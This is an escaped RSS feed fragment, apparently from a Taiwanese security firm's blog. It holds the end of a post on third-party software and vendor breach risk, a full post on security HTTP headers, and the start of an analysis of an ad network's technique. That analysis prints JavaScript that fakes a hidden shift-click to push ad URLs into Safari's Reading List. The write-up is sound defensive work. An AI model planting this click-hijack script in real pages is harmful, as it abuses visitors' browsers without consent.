5
 
CheerZ&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;值得注意一看的是&lt;a href=&quot;http://developer.joomla.org/security/578-20140301-core-sql-injection.html&quot;&gt;官方公告&lt;/a&gt;，上面標註著漏洞回報時間以及修補時間。2014/2/6 接獲回報，2014/3/6 修復。在這整整一個月的時間之內，所有適用版本內的 Joomla! 網站都將受此漏洞影響。因此套件廠商的反應修復速度越慢，顧客暴露在風險之中的時間越長。&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;Project: Joomla!
SubProject: CMS
Severity: High
Versions: 3.1.0 through 3.2.2
Exploit type: SQL Injection
Reported Date: 2014-February-06
Fixed Date: 2014-March-06
CVE Number: Pending&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&quot;案例說明外包廠商&quot;&gt;案例說明：外包廠商&lt;/h3&gt;

&lt;iframe src=&quot;//embed.gettyimages.com/embed/147456329?et=tHsuT-4nxk-4NvmLZycwCA&amp;amp;sig=Z5X7iFr5V9vS70tCT49wQA8EldpRXSuV3jpoBtgTmg4=&quot; width=&quot;507&quot; height=&quot;406&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot;&gt; &lt;/iframe&gt;

&lt;p&gt;這樣的情境你是否熟悉？&lt;/p&gt;

&lt;p&gt;公司有一套客製化的系統需要建置，但是因為公司內部開發人員不足，因此把這個系統外包出去給廠商做。貨比三家不吃虧，比了 A B C 三家，發現 A 家最便宜實惠，交貨時間又短。決定就把這個系統發包給 A 廠商做。半年過去了，這個廠商順利交貨結案。&lt;/p&gt;

&lt;p&gt;一年過後，發現這個系統竟然遭到入侵，主動攻擊內部其他伺服器。「不是有買防火牆嗎？怎麼還會被入侵？」老闆說。這可嚴重了，馬上找廠商來刮一頓。沒想到，A 廠商表示，該案已經順利結案，維護期也已經過了，沒辦法提供協助，除非繼續簽訂維護合約。問題總得解決，簽訂了維護合約之後，A 廠商也協助把病毒砍掉了。圓滿結束？事情有那麼簡單嗎？&lt;/p&gt;

&lt;p&gt;過了兩天，系統又開始攻擊其他伺服器。「病毒不是已經砍掉了嗎？」老闆說。問題在哪大家應該都很清楚。在尋找資安廠商協助之下，發現主機是因為 A 廠商設計的系統含有漏洞，導致 SQL Injection 問題，遭攻擊者利用植入惡意程式。A 廠商百般無奈，摸摸鼻子把這個漏洞修補起來。又過了兩天，再度遭到入侵。看了看，發現又是另一個 SQL Injection 問題。在幾次與攻擊者的不斷角力之下，終於好像把問題都修完了。&lt;/p&gt;

&lt;p&gt;過了一週，系統再度有惡意程式的蹤跡，A 廠商也無能為力。資安廠商表示，買這個就對了！在陸續被迫買了防火牆、WAF、IDS 等設備後，雖然問題貌似改善，但系統仍然零星有入侵事件發生。公司只好「斷然處置」，等待下次預算，另請廠商重新開發系統。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;問題 1：該系統是否還有其他漏洞？&lt;/li&gt;
  &lt;li&gt;問題 2：公司的處置是否正確？&lt;/li&gt;
  &lt;li&gt;問題 3：A 廠商的其他客戶是否有類似的問題？&lt;/li&gt;
  &lt;li&gt;問題 4：不是有買資安設備？為什麼還會有資安事件？&lt;/li&gt;
  &lt;li&gt;問題 5：公司該如何自保？&lt;/li&gt;
  &lt;li&gt;問題 6：廠商該如何自保？&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;想一下以上各點問題。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;問題 1：該系統是否還有其他漏洞？&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如果一個在開發時期就沒有注意安全的系統，很有可能有更多不為人知的漏洞。如果被動依賴資安事件，發生一件修一個漏洞，那是永無止盡的。正確的方式應該是直接針對 A 廠商的原始碼進行黑箱&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;滲透測試&lt;/a&gt;、白箱源碼檢測 (Code Review)，才能快速找出所有風險。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;問題 2：公司的處置是否正確？&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;「貨比三家不吃虧」，節儉確實是美德，但是在資訊產業中，越便宜的系統可能代表著更多的 cost down，除了犧牲掉品質之外，可能帶給企業更多損失。在資安事件發生時，一定要找原本維運廠商負責，並且與資安顧問公司配合，協助廠商把問題解決。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;問題 3：A 廠商的其他客戶是否有類似的問題？&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;羅馬不是一日造成的，不安全的系統也不是一個漏洞造成的。廠商通常是做出一份系統，客製化販賣給不同的企業用戶。如果在建置的過程中沒有注意安全問題，今天這家客戶有這個漏洞，別的客戶一定也會有。因此如果採用了不良的廠商實作的系統，下一個被駭的可能就是自己。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;問題 4：不是有買資安設備？為什麼還會有資安事件？&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;「不是有買防火牆嗎？怎麼還會被入侵？」是很多傳統思維企業的共同心聲。防火牆不是萬靈丹，駭客也絕對不是電腦。並不是完全依賴資安設備就能夠避免資安問題。在駭客的手法中，更多是如何繞過各種防禦設備手段，甚至有些資安設備本身竟然含有資安弱點，企業反而因為資安設備導致系統被入侵。&lt;/p&gt;

&lt;p&gt;正確的思維應該是從人開始做起，建立正確的資安觀念、資安思維，學習駭客的思維。建立正確的系統開發流程、建立正確的資安事件處理流程。尋找信譽良好的資安顧問廠商，定期針對企業內部各系統進行滲透測試、弱點掃描。安全的建立絕非一蹴可及，唯有一步步踏穩才能走得更遠。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;問題 5：公司該如何自保？&lt;/li&gt;
  &lt;li&gt;問題 6：廠商該如何自保？&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;請看下一個章節「建議對策」。&lt;/p&gt;

&lt;h3 id=&quot;建議對策&quot;&gt;建議對策&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://www.flickr.com/photos/26604430@N05/5895021311/&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_cover.png&quot; alt=&quot;Countermeasure&quot; title=&quot;Countermeasure&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;一個安全的系統，絕對是由基礎建設開始，每個環節都兼顧到安全的設計，並且定期稽核程式碼安全，使用正確安全的方式開發。如果系統開發初期就沒有兼顧安全，後期不管怎麼修補，都還是會有漏洞讓攻擊者有機可趁。&lt;/p&gt;

&lt;p&gt;企業該如何自保？使用 OpenSource 第三方套件或者是系統委外開發，是企業無可避免的。如果是第三方套件，平時可以多加注意套件的資安消息，如果一有新的漏洞被發現，將可以在第一時間應變。若沒有足夠人力密切注意資安消息，也可以委請資安顧問廠商協助，在得知資安消息的第一時間通報企業。委外開發的系統，企業可以要求廠商提出專業公正第三方資安公司進行檢測，並且提出安全報告，證明該系統有經過滲透測試等安全檢測，保障雙方的權利。&lt;/p&gt;

&lt;p&gt;如果系統已經被入侵了，或者是被揭露了安全漏洞，該如何自保呢？在漏洞大量揭露的情況下，系統更會成為攻擊者的目標。因此要務必密切注意使用該套件的伺服器狀況，並且遵循以下原則：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;密切注意官方的更新程式並立即更新&lt;/li&gt;
  &lt;li&gt;此台伺服器的帳號密碼切勿與他台共用&lt;/li&gt;
  &lt;li&gt;將此台伺服器與其他伺服器隔離，避免遭入侵時受害範圍擴大&lt;/li&gt;
  &lt;li&gt;異地備份伺服器的系統記錄，並定時檢閱記錄，觀察是否有可疑行為&lt;/li&gt;
  &lt;li&gt;考慮採用 Web Application Firewall (WAF)、ModSecurity 伺服器安全模組，增加攻擊難度&lt;/li&gt;
  &lt;li&gt;重新評估使用遭入侵套件的必要性以及安全考量，避免成為企業的隱含風險&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;使用第三方套件加速開發節省成本的同時，務必也要考慮安全的問題，才不會因小失大，造成企業更大的損失。同時企業也必須增加資安的素養以及了解攻擊者的思維，別讓自己的企業成為下一個資安事件報導的對象。&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2014/03/14/3rd-party-software-security-issues/</link>
                <guid>https://devco.re/blog/2014/03/14/3rd-party-software-security-issues</guid>
                <pubDate>Fri, 14 Mar 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>HTTP Headers 的資安議題 (1)</title>
                <description>&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;

&lt;p&gt;隨著駭客攻擊事件日益漸增，原本經常被大眾所忽視的網站資安問題，現在已經逐漸受到重視。但是，許多企業主或開發人員雖然很想強化網站的安全性，卻不知道該如何從何著手。&lt;/p&gt;

&lt;p&gt;企業主通常想到的改善方案是添購資安設備，希望可以一勞永逸。我們姑且先不談「&lt;strong&gt;資訊界沒有永遠的安全&lt;/strong&gt;」這件事，企業光是要買到有效的資安設備就是一件令人頭痛的事情，不但要花許多時間聽取廠商的簡報，耗費大筆的經費採購，購買之後還要請員工或原廠技術人員協助調校、設定或教學，否則買了等於沒買。&lt;/p&gt;

&lt;p&gt;而對於技術人員來說，若要強化網站安全性，必須先了解駭客如何攻擊，才知道如何建立根本性的防禦機制。但是企業主通常捨不得送員工去參加專業的教育訓練，台灣員工拿的 22k 低薪也低得常常令人捨不得花錢去上課。&lt;/p&gt;

&lt;p&gt;如果有一種方式可以增強網站的基本安全性，而且不需要花大錢，又可以讓開發人員不用大幅度變更程式，應該是個皆大歡喜的方案？&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;究竟有沒有低成本的簡易防禦方法&quot;&gt;究竟有沒有低成本的簡易防禦方法？&lt;/h3&gt;

&lt;p&gt;有的！目前各家瀏覽器 (Google Chrome、Firefox、Safari、IE) 其實已經支援許多種資安相關的 HTTP headers。開發人員若在伺服器設定加入某些 headers，瀏覽器收到 response 時就會執行相對應的防禦機制，如此一來可直接提升網頁應用程式的基本安全性。這些 HTTP headers 通常也已被許多常見的 framework 納入爲基本功能，即使開發人員不清楚如何修改伺服器相關設定，也可以依靠 framework 提供的方式來使用這些 headers。因此使用這些 headers 來提升網站安全性就成爲頗具 CP 值的方式。&lt;/p&gt;

&lt;p&gt;目前最常見的資安相關 HTTP headers 可參考 &lt;a href=&quot;https://www.owasp.org/index.php/List_of_useful_HTTP_headers&quot;&gt;OWASP 網站&lt;/a&gt; 所條列的內容：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Content-Security-Policy (X-Content-Security-Policy、X-Webkit-CSP 都是同一系列)&lt;/li&gt;
  &lt;li&gt;Strict-Transport-Security&lt;/li&gt;
  &lt;li&gt;X-Content-Type-Options&lt;/li&gt;
  &lt;li&gt;X-Frame-Options&lt;/li&gt;
  &lt;li&gt;X-XSS-Protection&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;還有一些其他的資安相關 HTTP headers 也值得注意：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Access-Control-Allow-Origin&lt;/li&gt;
  &lt;li&gt;X-Download-Options&lt;/li&gt;
  &lt;li&gt;X-Permitted-Cross-Domain-Policies&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;最後有一項比較特別的是 Cookie 的安全設定，由於 Cookie 也是 HTTP headers 的一部份，因此本文也將其列出：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Set-Cookie: HttpOnly&lt;/li&gt;
  &lt;li&gt;Set-Cookie: Secure&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;上述 headers 的數量是不是稍微超過你的想像？其實這些技術早已被很多大公司採用，像是 Google、Facebook、Twitter 等常見的網路服務都可看到這些 headers 的蹤影。下面這張圖片使用 Chrome 的 Inspector 來觀察 Twitter 的 HTTP response 內容：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-twitter.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-twitter.jpg&quot; alt=&quot;Twitter 的 HTTP reponse&quot; title=&quot;Twitter 的 HTTP reponse&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;從畫紅線的部分我們可看到 Twitter 在 Cookie 設定了 Secure 與 HttpOnly 這兩個屬性，並且採用了 Strict-Transport-Security、X-Content-Type-Options、X-Frame-Options、X-XSS-Protection 這幾種 headers。&lt;/p&gt;

&lt;p&gt;如果覺得用圖形界面太麻煩，也可以使用 command line 的工具來觀察。下面這張圖片使用 curl 來觀察 Facebook 的 HTTP response 內容：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-facebook.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-facebook.jpg&quot; alt=&quot;Facebook 的 HTTP response&quot; title=&quot;Facebook 的 HTTP response&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;上述資安相關的-headers-想解決哪些問題&quot;&gt;上述資安相關的 headers 想解決哪些問題？&lt;/h3&gt;

&lt;p&gt;目前這些資安相關的 HTTP headers 想解決的問題主要可分為以下五大類：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;防禦 XSS (Cross Site Scripting)：
    &lt;ul&gt;
      &lt;li&gt;Content-Security-Policy&lt;/li&gt;
      &lt;li&gt;Set-Cookie: HttpOnly&lt;/li&gt;
      &lt;li&gt;X-XSS-Protection&lt;/li&gt;
      &lt;li&gt;X-Download-Options&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;防禦 Clickjacking：
    &lt;ul&gt;
      &lt;li&gt;X-Frame-Options&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;強化 HTTPS 機制：
    &lt;ul&gt;
      &lt;li&gt;Set-Cookie: Secure&lt;/li&gt;
      &lt;li&gt;Strict-Transport-Security&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;避免瀏覽器誤判文件形態：
    &lt;ul&gt;
      &lt;li&gt;X-Content-Type-Options&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;保護網站資源別被任意存取：
    &lt;ul&gt;
      &lt;li&gt;Access-Control-Allow-Origin（此 header 若設定錯誤會適得其反！）&lt;/li&gt;
      &lt;li&gt;X-Permitted-Cross-Domain-Policies&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;其中 &lt;a href=&quot;https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)&quot;&gt;XSS&lt;/a&gt; 與 &lt;a href=&quot;https://www.owasp.org/index.php/Clickjacking&quot;&gt;Clickjacking&lt;/a&gt; 是目前常見的攻擊手法，尤其 XSS 目前仍高居 &lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-Top_10&quot;&gt;OWASP Top 10 2013 的第三名&lt;/a&gt;，其嚴重性可見一斑。而在我們執行過的許多&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;滲透測試&lt;/a&gt;案之中，被我們找出 XSS 弱點的網站高達九成！實在是不能輕忽這些問題。若能降低這些手法攻擊成功的機率，企業的利益就能有更多的安全保障，客戶對企業的信賴亦會更加穩固。&lt;/p&gt;

&lt;h3 id=&quot;目前這些-headers-的使用狀況&quot;&gt;目前這些 headers 的使用狀況？&lt;/h3&gt;

&lt;p&gt;這麼簡便的基本防禦方式，理當廣為企業所採用，因此我們針對 &lt;a href=&quot;http://www.alexa.com/topsites/countries/TW&quot;&gt;Alexa Taiwan Top 525&lt;/a&gt; 中挑出 513 個可正常使用的網站（咦？一般不是 Top 500 嗎？我沒騙你，&lt;a href=&quot;http://www.alexa.com/topsites/countries;20/TW&quot;&gt;真的有 525&lt;/a&gt;），調查這些網站是否使用某些常見的 HTTP headers。結果相當令人失望，許多網站都未採用這些 headers。統計數據如下圖：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-statistic-alexa-taiwan.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-statistic-alexa-taiwan.png&quot; alt=&quot;HTTP headers statistic of Alexa Taiwan Top 513&quot; title=&quot;HTTP headers statistic of Alexa Taiwan Top 513&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;從統計結果中可發現最多人使用的 HttpOnly 只有 21.25%，排名第二的 X-Frame-Options 也只有 7.80%。而且這些數據尚未將 Google、Twitter 等大公司排除，若將前述國際公司排除後，這些比率恐怕會更低。&lt;/p&gt;

&lt;p&gt;不過在上述網站中有不少入口網站、漫畫網站、色情網站，或是公司並非台灣企業，無法反應台灣的使用狀況。恰好在 2012 年 10 月台灣有許多網路服務公司一同成立了 &lt;a href=&quot;http://www.tieataiwan.org/index.php&quot;&gt;TIEA 台灣網路暨電子商務產業發展協會&lt;/a&gt;，目前網站上的&lt;a href=&quot;http://www.tieataiwan.org/member.php&quot;&gt;會員名單&lt;/a&gt;中有 116 個會員，其中不少頗具代表性，正好可觀察這些公司營運的網站是否有採用這些 headers。統計數據如下圖：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140310/http-headers-statistic-tiea.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140310/http-headers-statistic-tiea.png&quot; alt=&quot;HTTP headers statistic of TIEA&quot; title=&quot;HTTP headers statistic of TIEA&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;很可惜地，所有 headers 的採用率比起上一份數據都還要低。除非公司網站僅使用靜態頁面，網站上沒有任何商業邏輯、帳號、個資，否則應該都要使用合適的 headers 為你的資安防禦工事多築一道牆。&lt;/p&gt;

&lt;p&gt;而且由於 meeya 目前沒有正式官網，是直接使用 facebook 粉絲頁作為官網，因此 Content-Security-Policy、Set-Cookie Secure、Strict-Transport-Security、X-Content-Type-Options、X-Frame-Options、X-XSS-Protection 等六項 headers 的統計數量都還要再減一，頓時 Content-Security-Policy 與 Strict-Transport-Security 的總數量皆降至 0 個。此狀況顯示出，即使是在一些台灣主流的網站中，相關營運人員在資安領域仍有許多努力與學習的空間。&lt;/p&gt;

&lt;p&gt;許多台灣企業經常顧著衝業績、開發新功能、趕著讓新服務上線，卻忽略了非常重要的基礎資安建設，往往是在遭到攻擊後才大呼損失慘重，甚至是已被滲透了而不自知，其企業利益與民眾個資的保障皆相當令人擔憂。&lt;/p&gt;

&lt;h3 id=&quot;下集預告&quot;&gt;下集預告&lt;/h3&gt;

&lt;p&gt;接下來本文的續作我們會分幾個篇章詳談各種 headers 的使用方式並介紹實際案例，下一篇將會探討專門防禦 XSS 的 HTTP headers，敬請期待！等不及的朋友們就請先用上面的一些關鍵字自行上網查詢囉！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/</link>
                <guid>https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1</guid>
                <pubDate>Mon, 10 Mar 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>奇優廣告 Qiyou 廣告手法剖析</title>
                <description>&lt;p&gt;歡迎來到我們的技術文章專欄！&lt;/p&gt;

&lt;p&gt;今天我們來談談「廣告顯示手法」。不少廣告商為了要增加廣告的曝光以及點擊率，會使用各種手法強迫使用者顯示廣告。例如彈出式視窗、內嵌廣告、強制跳轉等等。但這樣的手法有什麼好提的呢？今天有一個很特別的案例，讓我們來看看一個網站「&lt;a href=&quot;http://1kkk.com&quot;&gt;1kkk.com 極速漫畫&lt;/a&gt;」。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_02.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - 1kkk.com&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - 1kkk.com&quot; /&gt;&lt;br /&gt;
這是一個常見的網路漫畫網站，接著點擊進去漫畫頁面。&lt;br /&gt;
&lt;!-- more --&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_03.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - 1kkk.com 漫畫頁面&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - 1kkk.com 漫畫頁面&quot; /&gt;&lt;br /&gt;
網站中充斥著煩人的廣告，並且突然一閃而過 Safari 的「閱讀列表」動畫。怎麼會突然這樣呢？讓我們打開「閱讀列表」一探究竟。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_04.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - Safari 顯示閱讀側邊欄&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - Safari 顯示閱讀側邊欄&quot; /&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_05.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - Safari 閱讀列表被放置廣告 URL&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - Safari 閱讀列表被放置廣告 URL&quot; /&gt;&lt;/p&gt;

&lt;p&gt;打開閱讀列表之後，我們赫然發現裡面被加了非常多廣告的頁面！&lt;/p&gt;

&lt;p&gt;可以看以下影片示範：&lt;/p&gt;
&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/E-BGf1MwecU&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;這是怎麼做到的呢？就是一種利用 JavaScript 控制滑鼠點擊的變形應用。點選「網頁檢閱器」或是「開發者工具」，會看到一段奇怪的 JavaScript 控制滑鼠的點擊行為。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140306/blog_qiyou_hijack_06.png&quot; alt=&quot;奇優廣告 Qiyou 廣告手法剖析 - 廣告 JavaScript&quot; title=&quot;奇優廣告 Qiyou 廣告手法剖析 - 廣告 JavaScript&quot; /&gt;&lt;/p&gt;

&lt;p&gt;分析節錄後的 code 如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;force_add_url_to_readinglist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;target_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;href&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;target_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;style&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;display:none;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// https://developer.mozilla.org/en-US/docs/Web/API/event.initMouseEvent&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fake_event&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;MouseEvents&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;initMouseEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;click&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;fake_element&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dispatchEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fake_event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// nothing.&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

